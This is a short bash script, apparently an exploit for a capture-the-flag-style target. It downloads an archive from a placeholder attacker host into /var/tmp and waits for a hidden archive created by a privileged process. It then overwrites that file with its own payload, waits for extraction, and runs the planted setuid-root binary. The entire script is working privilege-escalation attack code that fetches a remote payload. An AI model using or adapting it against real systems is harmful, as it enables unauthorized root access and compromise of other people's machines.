#!/bin/bash

# download tar.gz file
curl http://<IP>:<Port>/a.tar.gz -o /var/tmp/a.tar.gz

# check if file exists
BEGIN=$(find /var/tmp -maxdepth 1 -type f -name ".*")
CUR=$(find /var/tmp -maxdepth 1 -type f -name ".*")

echo '[*] waiting for archive file to appear ...'
while [ "$BEGIN" == "END" -o "$CUR" == "" ]; do
    sleep 5
    CUR=$(find /var/tmp -maxdepth 1 -type f -name ".*")
done

echo "[*] archive file found, $CUR ..."
echo '[*] change the generated achive file ...'
cp /var/tmp/a.tar.gz $CUR

# wait until the archive file is extracted
echo '[*] waiting for the archive file to be extracted ...'
while [ ! -f /var/tmp/check/var/www/html/a ]; do
    sleep 5
done
echo '[*] archive file extracted ...'

echo '[!] execute the root+suid file ...'
/var/tmp/check/var/www/html/a
